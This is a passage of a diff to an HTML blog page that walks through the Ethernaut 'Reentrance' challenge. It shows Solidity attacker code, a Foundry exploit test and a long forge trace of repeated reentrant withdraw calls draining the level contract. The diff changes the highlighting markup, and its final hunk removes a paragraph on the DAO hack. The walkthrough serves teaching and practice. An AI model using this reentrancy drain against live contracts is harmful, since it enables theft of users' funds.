-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">balance</span> = <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span>;
-</span></span><span style="display:flex;"><span>    (<span style="color:#fff;font-weight:bold">bool</span> success, ) = owner.<span style="color:#fff;font-weight:bold">call</span>{<span style="color:#fff;font-weight:bold">value</span>: <span style="color:#fff;font-weight:bold">balance</span>}(<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">require</span>(success, <span style="color:#0ff;font-weight:bold">&#34;unable to withdraw&#34;</span>);
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="nb">balance</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">owner</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">balance</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;unable to withdraw&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Then, we set the initial donation to be 1/10 of the <code>Reentrance</code>
 contract&rsquo;s balance and start the exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#fff;font-weight:bold">function</span> exploit() <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">override</span> {
-</span></span><span style="display:flex;"><span>    vm.startPrank(player);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    ReentranceExploit expl = <span style="color:#fff;font-weight:bold">new</span> ReentranceExploit(level);
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> donation = <span style="color:#fff;font-weight:bold">address</span>(level).<span style="color:#fff;font-weight:bold">balance</span> / <span style="color:#ff0;font-weight:bold">10</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    expl.run{<span style="color:#fff;font-weight:bold">value</span>: donation}();
-</span></span><span style="display:flex;"><span>    expl.withdraw();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    vm.stopPrank();
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"> <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="k">internal</span> <span class="k">override</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">startPrank</span><span class="p">(</span><span class="n">player</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ReentranceExploit</span> <span class="n">expl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReentranceExploit</span><span class="p">(</span><span class="n">level</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">donation</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">level</span><span class="p">).</span><span class="nb">balance</span> <span class="o">/</span> <span class="mi">10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">expl</span><span class="p">.</span><span class="n">run</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">donation</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">expl</span><span class="p">.</span><span class="n">withdraw</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">stopPrank</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Here is how the forge&rsquo;s trace looks like:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#fff;font-weight:bold">test</span> --match-contract ReentranceTest -vvvv
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>[PASS] testReentrancy() (gas: 629051)
-</span></span><span style="display:flex;"><span>Traces:
-</span></span><span style="display:flex;"><span>  [629051] ReentranceTest::testReentrancy()
-</span></span><span style="display:flex;"><span>    ├─ [233837] ReentranceTest::create{value: 1000000000000000000}()
-</span></span><span style="display:flex;"><span>    │   ├─ [0] VM::prank(player: [0x2f66c75a001ba71ccb135934f48d844b46454543])
-</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   ├─ [214811] Ethernaut::createLevelInstance{value: 1000000000000000000}(ReentranceFactory: [0xce71065d4017f316ec606fe4422e11eb2c47c246])
-</span></span><span style="display:flex;"><span>    │   │   ├─ [156548] ReentranceFactory::createInstance{value: 1000000000000000000}(player: [0x2f66c75a001ba71ccb135934f48d844b46454543])
-</span></span><span style="display:flex;"><span>    │   │   │   ├─ [116965] → new Reentrance@<span style="color:#0ff;font-weight:bold">&#34;0x037f…dd8f&#34;</span>
-</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#ff0;font-weight:bold">584</span> bytes of code
-</span></span><span style="display:flex;"><span>    │   │   │   ├─ [55] Reentrance::fallback{value: 100000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   └─ ← Reentrance: [0x037fc82298142374d974839236d2e2df6b5bdd8f]
-</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog(player: player: [0x2f66c75a001ba71ccb135934f48d844b46454543], instance: Reentrance: [0x037fc82298142374d974839236d2e2df6b5bdd8f])
-</span></span><span style="display:flex;"><span>    │   │   └─ ← Reentrance: [0x037fc82298142374d974839236d2e2df6b5bdd8f]
-</span></span><span style="display:flex;"><span>    │   └─ ← Reentrance: [0x037fc82298142374d974839236d2e2df6b5bdd8f]
-</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [0x2f66c75a001ba71ccb135934f48d844b46454543])
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [170322] → new &lt;Unknown&gt;@<span style="color:#0ff;font-weight:bold">&#34;0xa2f9…f3a7&#34;</span>
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#ff0;font-weight:bold">849</span> bytes of code
-</span></span><span style="display:flex;"><span>    ├─ [119933] 0xa2f9…f3a7::run{value: 10000000000000}()
-</span></span><span style="display:flex;"><span>    │   ├─ [22510] Reentrance::donate{value: 10000000000000}(0xa2f9062527f5588fcfd767b218ce33210574f3a7)
-</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   ├─ [89866] Reentrance::withdraw(10000000000000)
-</span></span><span style="display:flex;"><span>    │   │   ├─ [82241] 0xa2f9…f3a7::fallback{value: 10000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   │   ├─ [81662] Reentrance::withdraw(10000000000000)
-</span></span><span style="display:flex;"><span>    │   │   │   │   ├─ [75150] 0xa2f9…f3a7::fallback{value: 10000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   ├─ [74687] Reentrance::withdraw(10000000000000)
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   ├─ [68587] 0xa2f9…f3a7::fallback{value: 10000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   ├─ [68124] Reentrance::withdraw(10000000000000)
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   ├─ [62024] 0xa2f9…f3a7::fallback{value: 10000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   ├─ [61560] Reentrance::withdraw(10000000000000)
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   ├─ [55460] 0xa2f9…f3a7::fallback{value: 10000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   ├─ [54997] Reentrance::withdraw(10000000000000)
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [48897] 0xa2f9…f3a7::fallback{value: 10000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [48434] Reentrance::withdraw(10000000000000)
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [42334] 0xa2f9…f3a7::fallback{value: 10000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [41871] Reentrance::withdraw(10000000000000)
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [35771] 0xa2f9…f3a7::fallback{value: 10000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [35308] Reentrance::withdraw(10000000000000)
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [29208] 0xa2f9…f3a7::fallback{value: 10000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [28744] Reentrance::withdraw(10000000000000)
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6724] 0xa2f9…f3a7::fallback{value: 10000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6257] Reentrance::withdraw(10000000000000)
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [196] 0xa2f9…f3a7::fallback{value: 10000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [7068] 0xa2f9…f3a7::3ccfd60b()
-</span></span><span style="display:flex;"><span>    │   ├─ [0] player::fallback{value: 110000000000000}()
-</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [0x2f66c75a001ba71ccb135934f48d844b46454543])
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [3665] Ethernaut::submitLevelInstance(Reentrance: [0x037fc82298142374d974839236d2e2df6b5bdd8f])
-</span></span><span style="display:flex;"><span>    │   ├─ [618] ReentranceFactory::validateInstance(Reentrance: [0x037fc82298142374d974839236d2e2df6b5bdd8f], player: [0x2f66c75a001ba71ccb135934f48d844b46454543])
-</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
-</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog(player: player: [0x2f66c75a001ba71ccb135934f48d844b46454543], level: ReentranceFactory: [0xce71065d4017f316ec606fe4422e11eb2c47c246])
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
-</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    └─ ← ()
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ forge <span class="nb">test</span> --match-contract ReentranceTest -vvvv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>PASS<span class="o">]</span> testReentrancy<span class="o">()</span> <span class="o">(</span>gas: 629051<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Traces:
+</span></span><span class="line"><span class="cl">  <span class="o">[</span>629051<span class="o">]</span> ReentranceTest::testReentrancy<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>233837<span class="o">]</span> ReentranceTest::create<span class="o">{</span>value: 1000000000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   ├─ <span class="o">[</span>0<span class="o">]</span> VM::prank<span class="o">(</span>player: <span class="o">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   ├─ <span class="o">[</span>214811<span class="o">]</span> Ethernaut::createLevelInstance<span class="o">{</span>value: 1000000000000000000<span class="o">}(</span>ReentranceFactory: <span class="o">[</span>0xce71065d4017f316ec606fe4422e11eb2c47c246<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   │   ├─ <span class="o">[</span>156548<span class="o">]</span> ReentranceFactory::createInstance<span class="o">{</span>value: 1000000000000000000<span class="o">}(</span>player: <span class="o">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   │   │   ├─ <span class="o">[</span>116965<span class="o">]</span> → new Reentrance@<span class="s2">&#34;0x037f…dd8f&#34;</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   └─ ← <span class="m">584</span> bytes of code
+</span></span><span class="line"><span class="cl">    │   │   │   ├─ <span class="o">[</span>55<span class="o">]</span> Reentrance::fallback<span class="o">{</span>value: 100000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   └─ ← Reentrance: <span class="o">[</span>0x037fc82298142374d974839236d2e2df6b5bdd8f<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    │   │   ├─ emit LevelInstanceCreatedLog<span class="o">(</span>player: player: <span class="o">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span class="o">]</span>, instance: Reentrance: <span class="o">[</span>0x037fc82298142374d974839236d2e2df6b5bdd8f<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   │   └─ ← Reentrance: <span class="o">[</span>0x037fc82298142374d974839236d2e2df6b5bdd8f<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← Reentrance: <span class="o">[</span>0x037fc82298142374d974839236d2e2df6b5bdd8f<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>0<span class="o">]</span> VM::startPrank<span class="o">(</span>player: <span class="o">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>170322<span class="o">]</span> → new &lt;Unknown&gt;@<span class="s2">&#34;0xa2f9…f3a7&#34;</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="m">849</span> bytes of code
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>119933<span class="o">]</span> 0xa2f9…f3a7::run<span class="o">{</span>value: 10000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   ├─ <span class="o">[</span>22510<span class="o">]</span> Reentrance::donate<span class="o">{</span>value: 10000000000000<span class="o">}(</span>0xa2f9062527f5588fcfd767b218ce33210574f3a7<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   ├─ <span class="o">[</span>89866<span class="o">]</span> Reentrance::withdraw<span class="o">(</span>10000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    │   │   ├─ <span class="o">[</span>82241<span class="o">]</span> 0xa2f9…f3a7::fallback<span class="o">{</span>value: 10000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   ├─ <span class="o">[</span>81662<span class="o">]</span> Reentrance::withdraw<span class="o">(</span>10000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   ├─ <span class="o">[</span>75150<span class="o">]</span> 0xa2f9…f3a7::fallback<span class="o">{</span>value: 10000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   ├─ <span class="o">[</span>74687<span class="o">]</span> Reentrance::withdraw<span class="o">(</span>10000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   ├─ <span class="o">[</span>68587<span class="o">]</span> 0xa2f9…f3a7::fallback<span class="o">{</span>value: 10000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   ├─ <span class="o">[</span>68124<span class="o">]</span> Reentrance::withdraw<span class="o">(</span>10000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>62024<span class="o">]</span> 0xa2f9…f3a7::fallback<span class="o">{</span>value: 10000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>61560<span class="o">]</span> Reentrance::withdraw<span class="o">(</span>10000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>55460<span class="o">]</span> 0xa2f9…f3a7::fallback<span class="o">{</span>value: 10000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>54997<span class="o">]</span> Reentrance::withdraw<span class="o">(</span>10000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>48897<span class="o">]</span> 0xa2f9…f3a7::fallback<span class="o">{</span>value: 10000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>48434<span class="o">]</span> Reentrance::withdraw<span class="o">(</span>10000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>42334<span class="o">]</span> 0xa2f9…f3a7::fallback<span class="o">{</span>value: 10000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>41871<span class="o">]</span> Reentrance::withdraw<span class="o">(</span>10000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>35771<span class="o">]</span> 0xa2f9…f3a7::fallback<span class="o">{</span>value: 10000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>35308<span class="o">]</span> Reentrance::withdraw<span class="o">(</span>10000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>29208<span class="o">]</span> 0xa2f9…f3a7::fallback<span class="o">{</span>value: 10000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>28744<span class="o">]</span> Reentrance::withdraw<span class="o">(</span>10000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>6724<span class="o">]</span> 0xa2f9…f3a7::fallback<span class="o">{</span>value: 10000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>6257<span class="o">]</span> Reentrance::withdraw<span class="o">(</span>10000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span class="o">[</span>196<span class="o">]</span> 0xa2f9…f3a7::fallback<span class="o">{</span>value: 10000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>7068<span class="o">]</span> 0xa2f9…f3a7::3ccfd60b<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   ├─ <span class="o">[</span>0<span class="o">]</span> player::fallback<span class="o">{</span>value: 110000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">    │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>0<span class="o">]</span> VM::stopPrank<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>0<span class="o">]</span> VM::startPrank<span class="o">(</span>player: <span class="o">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>3665<span class="o">]</span> Ethernaut::submitLevelInstance<span class="o">(</span>Reentrance: <span class="o">[</span>0x037fc82298142374d974839236d2e2df6b5bdd8f<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   ├─ <span class="o">[</span>618<span class="o">]</span> ReentranceFactory::validateInstance<span class="o">(</span>Reentrance: <span class="o">[</span>0x037fc82298142374d974839236d2e2df6b5bdd8f<span class="o">]</span>, player: <span class="o">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   │   └─ ← <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">    │   ├─ emit LevelCompletedLog<span class="o">(</span>player: player: <span class="o">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span class="o">]</span>, level: ReentranceFactory: <span class="o">[</span>0xce71065d4017f316ec606fe4422e11eb2c47c246<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">    ├─ <span class="o">[</span>0<span class="o">]</span> VM::stopPrank<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">    └─ ← <span class="o">()</span>
 </span></span></code></pre></div><h2 id="lessons-learned">
   Lessons learned
   <a class="heading-link" href="#lessons-learned">
@@ -536,29 +529,16 @@ contract&rsquo;s balance and start the exploit:</p>
     <span class="sr-only">Link to heading</span>
   </a>
 </h2>
-<p>Both of the major bugs that led to the
-<a href="https://en.wikipedia.org/wiki/The_DAO_%28organization%29"  class="external-link" target="_blank" rel="noopener">DAO</a>
-<a href="https://coinmarketcap.com/alexandria/article/a-history-of-the-dao-hack"  class="external-link" target="_blank" rel="noopener">hack</a>
-were related to
-<a href="https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/"  class="external-link" target="_blank" rel="noopener">re-entrancy</a>
-issues.
-<a href="https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/"  class="external-link" target="_blank" rel="noopener">Here
-is the great in-depth explanation of the DAO hack</a>, so be sure
-to give it a read if you&rsquo;re interested to understand it deeper.</p>
